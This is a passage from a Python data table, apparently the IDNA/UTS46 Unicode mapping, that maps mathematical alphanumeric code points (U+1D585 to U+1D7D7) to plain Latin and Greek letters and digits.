\'M\', \'y\'),\n    (0x1D585, \'M\', \'z\'),\n    (0x1D586, \'M\', \'a\'),\n    (0x1D587, \'M\', \'b\'),\n    (0x1D588, \'M\', \'c\'),\n    (0x1D589, \'M\', \'d\'),\n    (0x1D58A, \'M\', \'e\'),\n    (0x1D58B, \'M\', \'f\'),\n    (0x1D58C, \'M\', \'g\'),\n    (0x1D58D, \'M\', \'h\'),\n    (0x1D58E, \'M\', \'i\'),\n    (0x1D58F, \'M\', \'j\'),\n    (0x1D590, \'M\', \'k\'),\n    (0x1D591, \'M\', \'l\'),\n    (0x1D592, \'M\', \'m\'),\n    (0x1D593, \'M\', \'n\'),\n    (0x1D594, \'M\', \'o\'),\n    (0x1D595, \'M\', \'p\'),\n    (0x1D596, \'M\', \'q\'),\n    (0x1D597, \'M\', \'r\'),\n    (0x1D598, \'M\', \'s\'),\n    (0x1D599, \'M\', \'t\'),\n    (0x1D59A, \'M\', \'u\'),\n    (0x1D59B, \'M\', \'v\'),\n    (0x1D59C, \'M\', \'w\'),\n    (0x1D59D, \'M\', \'x\'),\n    (0x1D59E, \'M\', \'y\'),\n    (0x1D59F, \'M\', \'z\'),\n    (0x1D5A0, \'M\', \'a\'),\n    (0x1D5A1, \'M\', \'b\'),\n    (0x1D5A2, \'M\', \'c\'),\n    (0x1D5A3, \'M\', \'d\'),\n    (0x1D5A4, \'M\', \'e\'),\n    (0x1D5A5, \'M\', \'f\'),\n    (0x1D5A6, \'M\', \'g\'),\n    (0x1D5A7, \'M\', \'h\'),\n    (0x1D5A8, \'M\', \'i\'),\n    (0x1D5A9, \'M\', \'j\'),\n    (0x1D5AA, \'M\', \'k\'),\n    (0x1D5AB, \'M\', \'l\'),\n    (0x1D5AC, \'M\', \'m\'),\n    (0x1D5AD, \'M\', \'n\'),\n    (0x1D5AE, \'M\', \'o\'),\n    (0x1D5AF, \'M\', \'p\'),\n    (0x1D5B0, \'M\', \'q\'),\n    (0x1D5B1, \'M\', \'r\'),\n    (0x1D5B2, \'M\', \'s\'),\n    (0x1D5B3, \'M\', \'t\'),\n    (0x1D5B4, \'M\', \'u\'),\n    (0x1D5B5, \'M\', \'v\'),\n    (0x1D5B6, \'M\', \'w\'),\n    (0x1D5B7, \'M\', \'x\'),\n    (0x1D5B8, \'M\', \'y\'),\n    (0x1D5B9, \'M\', \'z\'),\n    (0x1D5BA, \'M\', \'a\'),\n    (0x1D5BB, \'M\', \'b\'),\n    (0x1D5BC, \'M\', \'c\'),\n    (0x1D5BD, \'M\', \'d\'),\n    (0x1D5BE, \'M\', \'e\'),\n    (0x1D5BF, \'M\', \'f\'),\n    (0x1D5C0, \'M\', \'g\'),\n    (0x1D5C1, \'M\', \'h\'),\n    (0x1D5C2, \'M\', \'i\'),\n    (0x1D5C3, \'M\', \'j\'),\n    (0x1D5C4, \'M\', \'k\'),\n    (0x1D5C5, \'M\', \'l\'),\n    (0x1D5C6, \'M\', \'m\'),\n    ]\n\ndef _seg_65() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D5C7, \'M\', \'n\'),\n    (0x1D5C8, \'M\', \'o\'),\n    (0x1D5C9, \'M\', \'p\'),\n    (0x1D5CA, \'M\', \'q\'),\n    (0x1D5CB, \'M\', \'r\'),\n    (0x1D5CC, \'M\', \'s\'),\n    (0x1D5CD, \'M\', \'t\'),\n    (0x1D5CE, \'M\', \'u\'),\n    (0x1D5CF, \'M\', \'v\'),\n    (0x1D5D0, \'M\', \'w\'),\n    (0x1D5D1, \'M\', \'x\'),\n    (0x1D5D2, \'M\', \'y\'),\n    (0x1D5D3, \'M\', \'z\'),\n    (0x1D5D4, \'M\', \'a\'),\n    (0x1D5D5, \'M\', \'b\'),\n    (0x1D5D6, \'M\', \'c\'),\n    (0x1D5D7, \'M\', \'d\'),\n    (0x1D5D8, \'M\', \'e\'),\n    (0x1D5D9, \'M\', \'f\'),\n    (0x1D5DA, \'M\', \'g\'),\n    (0x1D5DB, \'M\', \'h\'),\n    (0x1D5DC, \'M\', \'i\'),\n    (0x1D5DD, \'M\', \'j\'),\n    (0x1D5DE, \'M\', \'k\'),\n    (0x1D5DF, \'M\', \'l\'),\n    (0x1D5E0, \'M\', \'m\'),\n    (0x1D5E1, \'M\', \'n\'),\n    (0x1D5E2, \'M\', \'o\'),\n    (0x1D5E3, \'M\', \'p\'),\n    (0x1D5E4, \'M\', \'q\'),\n    (0x1D5E5, \'M\', \'r\'),\n    (0x1D5E6, \'M\', \'s\'),\n    (0x1D5E7, \'M\', \'t\'),\n    (0x1D5E8, \'M\', \'u\'),\n    (0x1D5E9, \'M\', \'v\'),\n    (0x1D5EA, \'M\', \'w\'),\n    (0x1D5EB, \'M\', \'x\'),\n    (0x1D5EC, \'M\', \'y\'),\n    (0x1D5ED, \'M\', \'z\'),\n    (0x1D5EE, \'M\', \'a\'),\n    (0x1D5EF, \'M\', \'b\'),\n    (0x1D5F0, \'M\', \'c\'),\n    (0x1D5F1, \'M\', \'d\'),\n    (0x1D5F2, \'M\', \'e\'),\n    (0x1D5F3, \'M\', \'f\'),\n    (0x1D5F4, \'M\', \'g\'),\n    (0x1D5F5, \'M\', \'h\'),\n    (0x1D5F6, \'M\', \'i\'),\n    (0x1D5F7, \'M\', \'j\'),\n    (0x1D5F8, \'M\', \'k\'),\n    (0x1D5F9, \'M\', \'l\'),\n    (0x1D5FA, \'M\', \'m\'),\n    (0x1D5FB, \'M\', \'n\'),\n    (0x1D5FC, \'M\', \'o\'),\n    (0x1D5FD, \'M\', \'p\'),\n    (0x1D5FE, \'M\', \'q\'),\n    (0x1D5FF, \'M\', \'r\'),\n    (0x1D600, \'M\', \'s\'),\n    (0x1D601, \'M\', \'t\'),\n    (0x1D602, \'M\', \'u\'),\n    (0x1D603, \'M\', \'v\'),\n    (0x1D604, \'M\', \'w\'),\n    (0x1D605, \'M\', \'x\'),\n    (0x1D606, \'M\', \'y\'),\n    (0x1D607, \'M\', \'z\'),\n    (0x1D608, \'M\', \'a\'),\n    (0x1D609, \'M\', \'b\'),\n    (0x1D60A, \'M\', \'c\'),\n    (0x1D60B, \'M\', \'d\'),\n    (0x1D60C, \'M\', \'e\'),\n    (0x1D60D, \'M\', \'f\'),\n    (0x1D60E, \'M\', \'g\'),\n    (0x1D60F, \'M\', \'h\'),\n    (0x1D610, \'M\', \'i\'),\n    (0x1D611, \'M\', \'j\'),\n    (0x1D612, \'M\', \'k\'),\n    (0x1D613, \'M\', \'l\'),\n    (0x1D614, \'M\', \'m\'),\n    (0x1D615, \'M\', \'n\'),\n    (0x1D616, \'M\', \'o\'),\n    (0x1D617, \'M\', \'p\'),\n    (0x1D618, \'M\', \'q\'),\n    (0x1D619, \'M\', \'r\'),\n    (0x1D61A, \'M\', \'s\'),\n    (0x1D61B, \'M\', \'t\'),\n    (0x1D61C, \'M\', \'u\'),\n    (0x1D61D, \'M\', \'v\'),\n    (0x1D61E, \'M\', \'w\'),\n    (0x1D61F, \'M\', \'x\'),\n    (0x1D620, \'M\', \'y\'),\n    (0x1D621, \'M\', \'z\'),\n    (0x1D622, \'M\', \'a\'),\n    (0x1D623, \'M\', \'b\'),\n    (0x1D624, \'M\', \'c\'),\n    (0x1D625, \'M\', \'d\'),\n    (0x1D626, \'M\', \'e\'),\n    (0x1D627, \'M\', \'f\'),\n    (0x1D628, \'M\', \'g\'),\n    (0x1D629, \'M\', \'h\'),\n    (0x1D62A, \'M\', \'i\'),\n    ]\n\ndef _seg_66() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D62B, \'M\', \'j\'),\n    (0x1D62C, \'M\', \'k\'),\n    (0x1D62D, \'M\', \'l\'),\n    (0x1D62E, \'M\', \'m\'),\n    (0x1D62F, \'M\', \'n\'),\n    (0x1D630, \'M\', \'o\'),\n    (0x1D631, \'M\', \'p\'),\n    (0x1D632, \'M\', \'q\'),\n    (0x1D633, \'M\', \'r\'),\n    (0x1D634, \'M\', \'s\'),\n    (0x1D635, \'M\', \'t\'),\n    (0x1D636, \'M\', \'u\'),\n    (0x1D637, \'M\', \'v\'),\n    (0x1D638, \'M\', \'w\'),\n    (0x1D639, \'M\', \'x\'),\n    (0x1D63A, \'M\', \'y\'),\n    (0x1D63B, \'M\', \'z\'),\n    (0x1D63C, \'M\', \'a\'),\n    (0x1D63D, \'M\', \'b\'),\n    (0x1D63E, \'M\', \'c\'),\n    (0x1D63F, \'M\', \'d\'),\n    (0x1D640, \'M\', \'e\'),\n    (0x1D641, \'M\', \'f\'),\n    (0x1D642, \'M\', \'g\'),\n    (0x1D643, \'M\', \'h\'),\n    (0x1D644, \'M\', \'i\'),\n    (0x1D645, \'M\', \'j\'),\n    (0x1D646, \'M\', \'k\'),\n    (0x1D647, \'M\', \'l\'),\n    (0x1D648, \'M\', \'m\'),\n    (0x1D649, \'M\', \'n\'),\n    (0x1D64A, \'M\', \'o\'),\n    (0x1D64B, \'M\', \'p\'),\n    (0x1D64C, \'M\', \'q\'),\n    (0x1D64D, \'M\', \'r\'),\n    (0x1D64E, \'M\', \'s\'),\n    (0x1D64F, \'M\', \'t\'),\n    (0x1D650, \'M\', \'u\'),\n    (0x1D651, \'M\', \'v\'),\n    (0x1D652, \'M\', \'w\'),\n    (0x1D653, \'M\', \'x\'),\n    (0x1D654, \'M\', \'y\'),\n    (0x1D655, \'M\', \'z\'),\n    (0x1D656, \'M\', \'a\'),\n    (0x1D657, \'M\', \'b\'),\n    (0x1D658, \'M\', \'c\'),\n    (0x1D659, \'M\', \'d\'),\n    (0x1D65A, \'M\', \'e\'),\n    (0x1D65B, \'M\', \'f\'),\n    (0x1D65C, \'M\', \'g\'),\n    (0x1D65D, \'M\', \'h\'),\n    (0x1D65E, \'M\', \'i\'),\n    (0x1D65F, \'M\', \'j\'),\n    (0x1D660, \'M\', \'k\'),\n    (0x1D661, \'M\', \'l\'),\n    (0x1D662, \'M\', \'m\'),\n    (0x1D663, \'M\', \'n\'),\n    (0x1D664, \'M\', \'o\'),\n    (0x1D665, \'M\', \'p\'),\n    (0x1D666, \'M\', \'q\'),\n    (0x1D667, \'M\', \'r\'),\n    (0x1D668, \'M\', \'s\'),\n    (0x1D669, \'M\', \'t\'),\n    (0x1D66A, \'M\', \'u\'),\n    (0x1D66B, \'M\', \'v\'),\n    (0x1D66C, \'M\', \'w\'),\n    (0x1D66D, \'M\', \'x\'),\n    (0x1D66E, \'M\', \'y\'),\n    (0x1D66F, \'M\', \'z\'),\n    (0x1D670, \'M\', \'a\'),\n    (0x1D671, \'M\', \'b\'),\n    (0x1D672, \'M\', \'c\'),\n    (0x1D673, \'M\', \'d\'),\n    (0x1D674, \'M\', \'e\'),\n    (0x1D675, \'M\', \'f\'),\n    (0x1D676, \'M\', \'g\'),\n    (0x1D677, \'M\', \'h\'),\n    (0x1D678, \'M\', \'i\'),\n    (0x1D679, \'M\', \'j\'),\n    (0x1D67A, \'M\', \'k\'),\n    (0x1D67B, \'M\', \'l\'),\n    (0x1D67C, \'M\', \'m\'),\n    (0x1D67D, \'M\', \'n\'),\n    (0x1D67E, \'M\', \'o\'),\n    (0x1D67F, \'M\', \'p\'),\n    (0x1D680, \'M\', \'q\'),\n    (0x1D681, \'M\', \'r\'),\n    (0x1D682, \'M\', \'s\'),\n    (0x1D683, \'M\', \'t\'),\n    (0x1D684, \'M\', \'u\'),\n    (0x1D685, \'M\', \'v\'),\n    (0x1D686, \'M\', \'w\'),\n    (0x1D687, \'M\', \'x\'),\n    (0x1D688, \'M\', \'y\'),\n    (0x1D689, \'M\', \'z\'),\n    (0x1D68A, \'M\', \'a\'),\n    (0x1D68B, \'M\', \'b\'),\n    (0x1D68C, \'M\', \'c\'),\n    (0x1D68D, \'M\', \'d\'),\n    (0x1D68E, \'M\', \'e\'),\n    ]\n\ndef _seg_67() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D68F, \'M\', \'f\'),\n    (0x1D690, \'M\', \'g\'),\n    (0x1D691, \'M\', \'h\'),\n    (0x1D692, \'M\', \'i\'),\n    (0x1D693, \'M\', \'j\'),\n    (0x1D694, \'M\', \'k\'),\n    (0x1D695, \'M\', \'l\'),\n    (0x1D696, \'M\', \'m\'),\n    (0x1D697, \'M\', \'n\'),\n    (0x1D698, \'M\', \'o\'),\n    (0x1D699, \'M\', \'p\'),\n    (0x1D69A, \'M\', \'q\'),\n    (0x1D69B, \'M\', \'r\'),\n    (0x1D69C, \'M\', \'s\'),\n    (0x1D69D, \'M\', \'t\'),\n    (0x1D69E, \'M\', \'u\'),\n    (0x1D69F, \'M\', \'v\'),\n    (0x1D6A0, \'M\', \'w\'),\n    (0x1D6A1, \'M\', \'x\'),\n    (0x1D6A2, \'M\', \'y\'),\n    (0x1D6A3, \'M\', \'z\'),\n    (0x1D6A4, \'M\', \'\xc4\xb1\'),\n    (0x1D6A5, \'M\', \'\xc8\xb7\'),\n    (0x1D6A6, \'X\'),\n    (0x1D6A8, \'M\', \'\xce\xb1\'),\n    (0x1D6A9, \'M\', \'\xce\xb2\'),\n    (0x1D6AA, \'M\', \'\xce\xb3\'),\n    (0x1D6AB, \'M\', \'\xce\xb4\'),\n    (0x1D6AC, \'M\', \'\xce\xb5\'),\n    (0x1D6AD, \'M\', \'\xce\xb6\'),\n    (0x1D6AE, \'M\', \'\xce\xb7\'),\n    (0x1D6AF, \'M\', \'\xce\xb8\'),\n    (0x1D6B0, \'M\', \'\xce\xb9\'),\n    (0x1D6B1, \'M\', \'\xce\xba\'),\n    (0x1D6B2, \'M\', \'\xce\xbb\'),\n    (0x1D6B3, \'M\', \'\xce\xbc\'),\n    (0x1D6B4, \'M\', \'\xce\xbd\'),\n    (0x1D6B5, \'M\', \'\xce\xbe\'),\n    (0x1D6B6, \'M\', \'\xce\xbf\'),\n    (0x1D6B7, \'M\', \'\xcf\x80\'),\n    (0x1D6B8, \'M\', \'\xcf\x81\'),\n    (0x1D6B9, \'M\', \'\xce\xb8\'),\n    (0x1D6BA, \'M\', \'\xcf\x83\'),\n    (0x1D6BB, \'M\', \'\xcf\x84\'),\n    (0x1D6BC, \'M\', \'\xcf\x85\'),\n    (0x1D6BD, \'M\', \'\xcf\x86\'),\n    (0x1D6BE, \'M\', \'\xcf\x87\'),\n    (0x1D6BF, \'M\', \'\xcf\x88\'),\n    (0x1D6C0, \'M\', \'\xcf\x89\'),\n    (0x1D6C1, \'M\', \'\xe2\x88\x87\'),\n    (0x1D6C2, \'M\', \'\xce\xb1\'),\n    (0x1D6C3, \'M\', \'\xce\xb2\'),\n    (0x1D6C4, \'M\', \'\xce\xb3\'),\n    (0x1D6C5, \'M\', \'\xce\xb4\'),\n    (0x1D6C6, \'M\', \'\xce\xb5\'),\n    (0x1D6C7, \'M\', \'\xce\xb6\'),\n    (0x1D6C8, \'M\', \'\xce\xb7\'),\n    (0x1D6C9, \'M\', \'\xce\xb8\'),\n    (0x1D6CA, \'M\', \'\xce\xb9\'),\n    (0x1D6CB, \'M\', \'\xce\xba\'),\n    (0x1D6CC, \'M\', \'\xce\xbb\'),\n    (0x1D6CD, \'M\', \'\xce\xbc\'),\n    (0x1D6CE, \'M\', \'\xce\xbd\'),\n    (0x1D6CF, \'M\', \'\xce\xbe\'),\n    (0x1D6D0, \'M\', \'\xce\xbf\'),\n    (0x1D6D1, \'M\', \'\xcf\x80\'),\n    (0x1D6D2, \'M\', \'\xcf\x81\'),\n    (0x1D6D3, \'M\', \'\xcf\x83\'),\n    (0x1D6D5, \'M\', \'\xcf\x84\'),\n    (0x1D6D6, \'M\', \'\xcf\x85\'),\n    (0x1D6D7, \'M\', \'\xcf\x86\'),\n    (0x1D6D8, \'M\', \'\xcf\x87\'),\n    (0x1D6D9, \'M\', \'\xcf\x88\'),\n    (0x1D6DA, \'M\', \'\xcf\x89\'),\n    (0x1D6DB, \'M\', \'\xe2\x88\x82\'),\n    (0x1D6DC, \'M\', \'\xce\xb5\'),\n    (0x1D6DD, \'M\', \'\xce\xb8\'),\n    (0x1D6DE, \'M\', \'\xce\xba\'),\n    (0x1D6DF, \'M\', \'\xcf\x86\'),\n    (0x1D6E0, \'M\', \'\xcf\x81\'),\n    (0x1D6E1, \'M\', \'\xcf\x80\'),\n    (0x1D6E2, \'M\', \'\xce\xb1\'),\n    (0x1D6E3, \'M\', \'\xce\xb2\'),\n    (0x1D6E4, \'M\', \'\xce\xb3\'),\n    (0x1D6E5, \'M\', \'\xce\xb4\'),\n    (0x1D6E6, \'M\', \'\xce\xb5\'),\n    (0x1D6E7, \'M\', \'\xce\xb6\'),\n    (0x1D6E8, \'M\', \'\xce\xb7\'),\n    (0x1D6E9, \'M\', \'\xce\xb8\'),\n    (0x1D6EA, \'M\', \'\xce\xb9\'),\n    (0x1D6EB, \'M\', \'\xce\xba\'),\n    (0x1D6EC, \'M\', \'\xce\xbb\'),\n    (0x1D6ED, \'M\', \'\xce\xbc\'),\n    (0x1D6EE, \'M\', \'\xce\xbd\'),\n    (0x1D6EF, \'M\', \'\xce\xbe\'),\n    (0x1D6F0, \'M\', \'\xce\xbf\'),\n    (0x1D6F1, \'M\', \'\xcf\x80\'),\n    (0x1D6F2, \'M\', \'\xcf\x81\'),\n    (0x1D6F3, \'M\', \'\xce\xb8\'),\n    (0x1D6F4, \'M\', \'\xcf\x83\'),\n    ]\n\ndef _seg_68() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D6F5, \'M\', \'\xcf\x84\'),\n    (0x1D6F6, \'M\', \'\xcf\x85\'),\n    (0x1D6F7, \'M\', \'\xcf\x86\'),\n    (0x1D6F8, \'M\', \'\xcf\x87\'),\n    (0x1D6F9, \'M\', \'\xcf\x88\'),\n    (0x1D6FA, \'M\', \'\xcf\x89\'),\n    (0x1D6FB, \'M\', \'\xe2\x88\x87\'),\n    (0x1D6FC, \'M\', \'\xce\xb1\'),\n    (0x1D6FD, \'M\', \'\xce\xb2\'),\n    (0x1D6FE, \'M\', \'\xce\xb3\'),\n    (0x1D6FF, \'M\', \'\xce\xb4\'),\n    (0x1D700, \'M\', \'\xce\xb5\'),\n    (0x1D701, \'M\', \'\xce\xb6\'),\n    (0x1D702, \'M\', \'\xce\xb7\'),\n    (0x1D703, \'M\', \'\xce\xb8\'),\n    (0x1D704, \'M\', \'\xce\xb9\'),\n    (0x1D705, \'M\', \'\xce\xba\'),\n    (0x1D706, \'M\', \'\xce\xbb\'),\n    (0x1D707, \'M\', \'\xce\xbc\'),\n    (0x1D708, \'M\', \'\xce\xbd\'),\n    (0x1D709, \'M\', \'\xce\xbe\'),\n    (0x1D70A, \'M\', \'\xce\xbf\'),\n    (0x1D70B, \'M\', \'\xcf\x80\'),\n    (0x1D70C, \'M\', \'\xcf\x81\'),\n    (0x1D70D, \'M\', \'\xcf\x83\'),\n    (0x1D70F, \'M\', \'\xcf\x84\'),\n    (0x1D710, \'M\', \'\xcf\x85\'),\n    (0x1D711, \'M\', \'\xcf\x86\'),\n    (0x1D712, \'M\', \'\xcf\x87\'),\n    (0x1D713, \'M\', \'\xcf\x88\'),\n    (0x1D714, \'M\', \'\xcf\x89\'),\n    (0x1D715, \'M\', \'\xe2\x88\x82\'),\n    (0x1D716, \'M\', \'\xce\xb5\'),\n    (0x1D717, \'M\', \'\xce\xb8\'),\n    (0x1D718, \'M\', \'\xce\xba\'),\n    (0x1D719, \'M\', \'\xcf\x86\'),\n    (0x1D71A, \'M\', \'\xcf\x81\'),\n    (0x1D71B, \'M\', \'\xcf\x80\'),\n    (0x1D71C, \'M\', \'\xce\xb1\'),\n    (0x1D71D, \'M\', \'\xce\xb2\'),\n    (0x1D71E, \'M\', \'\xce\xb3\'),\n    (0x1D71F, \'M\', \'\xce\xb4\'),\n    (0x1D720, \'M\', \'\xce\xb5\'),\n    (0x1D721, \'M\', \'\xce\xb6\'),\n    (0x1D722, \'M\', \'\xce\xb7\'),\n    (0x1D723, \'M\', \'\xce\xb8\'),\n    (0x1D724, \'M\', \'\xce\xb9\'),\n    (0x1D725, \'M\', \'\xce\xba\'),\n    (0x1D726, \'M\', \'\xce\xbb\'),\n    (0x1D727, \'M\', \'\xce\xbc\'),\n    (0x1D728, \'M\', \'\xce\xbd\'),\n    (0x1D729, \'M\', \'\xce\xbe\'),\n    (0x1D72A, \'M\', \'\xce\xbf\'),\n    (0x1D72B, \'M\', \'\xcf\x80\'),\n    (0x1D72C, \'M\', \'\xcf\x81\'),\n    (0x1D72D, \'M\', \'\xce\xb8\'),\n    (0x1D72E, \'M\', \'\xcf\x83\'),\n    (0x1D72F, \'M\', \'\xcf\x84\'),\n    (0x1D730, \'M\', \'\xcf\x85\'),\n    (0x1D731, \'M\', \'\xcf\x86\'),\n    (0x1D732, \'M\', \'\xcf\x87\'),\n    (0x1D733, \'M\', \'\xcf\x88\'),\n    (0x1D734, \'M\', \'\xcf\x89\'),\n    (0x1D735, \'M\', \'\xe2\x88\x87\'),\n    (0x1D736, \'M\', \'\xce\xb1\'),\n    (0x1D737, \'M\', \'\xce\xb2\'),\n    (0x1D738, \'M\', \'\xce\xb3\'),\n    (0x1D739, \'M\', \'\xce\xb4\'),\n    (0x1D73A, \'M\', \'\xce\xb5\'),\n    (0x1D73B, \'M\', \'\xce\xb6\'),\n    (0x1D73C, \'M\', \'\xce\xb7\'),\n    (0x1D73D, \'M\', \'\xce\xb8\'),\n    (0x1D73E, \'M\', \'\xce\xb9\'),\n    (0x1D73F, \'M\', \'\xce\xba\'),\n    (0x1D740, \'M\', \'\xce\xbb\'),\n    (0x1D741, \'M\', \'\xce\xbc\'),\n    (0x1D742, \'M\', \'\xce\xbd\'),\n    (0x1D743, \'M\', \'\xce\xbe\'),\n    (0x1D744, \'M\', \'\xce\xbf\'),\n    (0x1D745, \'M\', \'\xcf\x80\'),\n    (0x1D746, \'M\', \'\xcf\x81\'),\n    (0x1D747, \'M\', \'\xcf\x83\'),\n    (0x1D749, \'M\', \'\xcf\x84\'),\n    (0x1D74A, \'M\', \'\xcf\x85\'),\n    (0x1D74B, \'M\', \'\xcf\x86\'),\n    (0x1D74C, \'M\', \'\xcf\x87\'),\n    (0x1D74D, \'M\', \'\xcf\x88\'),\n    (0x1D74E, \'M\', \'\xcf\x89\'),\n    (0x1D74F, \'M\', \'\xe2\x88\x82\'),\n    (0x1D750, \'M\', \'\xce\xb5\'),\n    (0x1D751, \'M\', \'\xce\xb8\'),\n    (0x1D752, \'M\', \'\xce\xba\'),\n    (0x1D753, \'M\', \'\xcf\x86\'),\n    (0x1D754, \'M\', \'\xcf\x81\'),\n    (0x1D755, \'M\', \'\xcf\x80\'),\n    (0x1D756, \'M\', \'\xce\xb1\'),\n    (0x1D757, \'M\', \'\xce\xb2\'),\n    (0x1D758, \'M\', \'\xce\xb3\'),\n    (0x1D759, \'M\', \'\xce\xb4\'),\n    (0x1D75A, \'M\', \'\xce\xb5\'),\n    ]\n\ndef _seg_69() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D75B, \'M\', \'\xce\xb6\'),\n    (0x1D75C, \'M\', \'\xce\xb7\'),\n    (0x1D75D, \'M\', \'\xce\xb8\'),\n    (0x1D75E, \'M\', \'\xce\xb9\'),\n    (0x1D75F, \'M\', \'\xce\xba\'),\n    (0x1D760, \'M\', \'\xce\xbb\'),\n    (0x1D761, \'M\', \'\xce\xbc\'),\n    (0x1D762, \'M\', \'\xce\xbd\'),\n    (0x1D763, \'M\', \'\xce\xbe\'),\n    (0x1D764, \'M\', \'\xce\xbf\'),\n    (0x1D765, \'M\', \'\xcf\x80\'),\n    (0x1D766, \'M\', \'\xcf\x81\'),\n    (0x1D767, \'M\', \'\xce\xb8\'),\n    (0x1D768, \'M\', \'\xcf\x83\'),\n    (0x1D769, \'M\', \'\xcf\x84\'),\n    (0x1D76A, \'M\', \'\xcf\x85\'),\n    (0x1D76B, \'M\', \'\xcf\x86\'),\n    (0x1D76C, \'M\', \'\xcf\x87\'),\n    (0x1D76D, \'M\', \'\xcf\x88\'),\n    (0x1D76E, \'M\', \'\xcf\x89\'),\n    (0x1D76F, \'M\', \'\xe2\x88\x87\'),\n    (0x1D770, \'M\', \'\xce\xb1\'),\n    (0x1D771, \'M\', \'\xce\xb2\'),\n    (0x1D772, \'M\', \'\xce\xb3\'),\n    (0x1D773, \'M\', \'\xce\xb4\'),\n    (0x1D774, \'M\', \'\xce\xb5\'),\n    (0x1D775, \'M\', \'\xce\xb6\'),\n    (0x1D776, \'M\', \'\xce\xb7\'),\n    (0x1D777, \'M\', \'\xce\xb8\'),\n    (0x1D778, \'M\', \'\xce\xb9\'),\n    (0x1D779, \'M\', \'\xce\xba\'),\n    (0x1D77A, \'M\', \'\xce\xbb\'),\n    (0x1D77B, \'M\', \'\xce\xbc\'),\n    (0x1D77C, \'M\', \'\xce\xbd\'),\n    (0x1D77D, \'M\', \'\xce\xbe\'),\n    (0x1D77E, \'M\', \'\xce\xbf\'),\n    (0x1D77F, \'M\', \'\xcf\x80\'),\n    (0x1D780, \'M\', \'\xcf\x81\'),\n    (0x1D781, \'M\', \'\xcf\x83\'),\n    (0x1D783, \'M\', \'\xcf\x84\'),\n    (0x1D784, \'M\', \'\xcf\x85\'),\n    (0x1D785, \'M\', \'\xcf\x86\'),\n    (0x1D786, \'M\', \'\xcf\x87\'),\n    (0x1D787, \'M\', \'\xcf\x88\'),\n    (0x1D788, \'M\', \'\xcf\x89\'),\n    (0x1D789, \'M\', \'\xe2\x88\x82\'),\n    (0x1D78A, \'M\', \'\xce\xb5\'),\n    (0x1D78B, \'M\', \'\xce\xb8\'),\n    (0x1D78C, \'M\', \'\xce\xba\'),\n    (0x1D78D, \'M\', \'\xcf\x86\'),\n    (0x1D78E, \'M\', \'\xcf\x81\'),\n    (0x1D78F, \'M\', \'\xcf\x80\'),\n    (0x1D790, \'M\', \'\xce\xb1\'),\n    (0x1D791, \'M\', \'\xce\xb2\'),\n    (0x1D792, \'M\', \'\xce\xb3\'),\n    (0x1D793, \'M\', \'\xce\xb4\'),\n    (0x1D794, \'M\', \'\xce\xb5\'),\n    (0x1D795, \'M\', \'\xce\xb6\'),\n    (0x1D796, \'M\', \'\xce\xb7\'),\n    (0x1D797, \'M\', \'\xce\xb8\'),\n    (0x1D798, \'M\', \'\xce\xb9\'),\n    (0x1D799, \'M\', \'\xce\xba\'),\n    (0x1D79A, \'M\', \'\xce\xbb\'),\n    (0x1D79B, \'M\', \'\xce\xbc\'),\n    (0x1D79C, \'M\', \'\xce\xbd\'),\n    (0x1D79D, \'M\', \'\xce\xbe\'),\n    (0x1D79E, \'M\', \'\xce\xbf\'),\n    (0x1D79F, \'M\', \'\xcf\x80\'),\n    (0x1D7A0, \'M\', \'\xcf\x81\'),\n    (0x1D7A1, \'M\', \'\xce\xb8\'),\n    (0x1D7A2, \'M\', \'\xcf\x83\'),\n    (0x1D7A3, \'M\', \'\xcf\x84\'),\n    (0x1D7A4, \'M\', \'\xcf\x85\'),\n    (0x1D7A5, \'M\', \'\xcf\x86\'),\n    (0x1D7A6, \'M\', \'\xcf\x87\'),\n    (0x1D7A7, \'M\', \'\xcf\x88\'),\n    (0x1D7A8, \'M\', \'\xcf\x89\'),\n    (0x1D7A9, \'M\', \'\xe2\x88\x87\'),\n    (0x1D7AA, \'M\', \'\xce\xb1\'),\n    (0x1D7AB, \'M\', \'\xce\xb2\'),\n    (0x1D7AC, \'M\', \'\xce\xb3\'),\n    (0x1D7AD, \'M\', \'\xce\xb4\'),\n    (0x1D7AE, \'M\', \'\xce\xb5\'),\n    (0x1D7AF, \'M\', \'\xce\xb6\'),\n    (0x1D7B0, \'M\', \'\xce\xb7\'),\n    (0x1D7B1, \'M\', \'\xce\xb8\'),\n    (0x1D7B2, \'M\', \'\xce\xb9\'),\n    (0x1D7B3, \'M\', \'\xce\xba\'),\n    (0x1D7B4, \'M\', \'\xce\xbb\'),\n    (0x1D7B5, \'M\', \'\xce\xbc\'),\n    (0x1D7B6, \'M\', \'\xce\xbd\'),\n    (0x1D7B7, \'M\', \'\xce\xbe\'),\n    (0x1D7B8, \'M\', \'\xce\xbf\'),\n    (0x1D7B9, \'M\', \'\xcf\x80\'),\n    (0x1D7BA, \'M\', \'\xcf\x81\'),\n    (0x1D7BB, \'M\', \'\xcf\x83\'),\n    (0x1D7BD, \'M\', \'\xcf\x84\'),\n    (0x1D7BE, \'M\', \'\xcf\x85\'),\n    (0x1D7BF, \'M\', \'\xcf\x86\'),\n    (0x1D7C0, \'M\', \'\xcf\x87\'),\n    ]\n\ndef _seg_70() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1D7C1, \'M\', \'\xcf\x88\'),\n    (0x1D7C2, \'M\', \'\xcf\x89\'),\n    (0x1D7C3, \'M\', \'\xe2\x88\x82\'),\n    (0x1D7C4, \'M\', \'\xce\xb5\'),\n    (0x1D7C5, \'M\', \'\xce\xb8\'),\n    (0x1D7C6, \'M\', \'\xce\xba\'),\n    (0x1D7C7, \'M\', \'\xcf\x86\'),\n    (0x1D7C8, \'M\', \'\xcf\x81\'),\n    (0x1D7C9, \'M\', \'\xcf\x80\'),\n    (0x1D7CA, \'M\', \'\xcf\x9d\'),\n    (0x1D7CC, \'X\'),\n    (0x1D7CE, \'M\', \'0\'),\n    (0x1D7CF, \'M\', \'1\'),\n    (0x1D7D0, \'M\', \'2\'),\n    (0x1D7D1, \'M\', \'3\'),\n    (0x1D7D2, \'M\', \'4\'),\n    (0x1D7D3, \'M\', \'5\'),\n    (0x1D7D4, \'M\', \'6\'),\n    (0x1D7D5, \'M\', \'7\'),\n    (0x1D7D6, \'M\', \'8\'),\n    (0x1D7D7, \'M\', 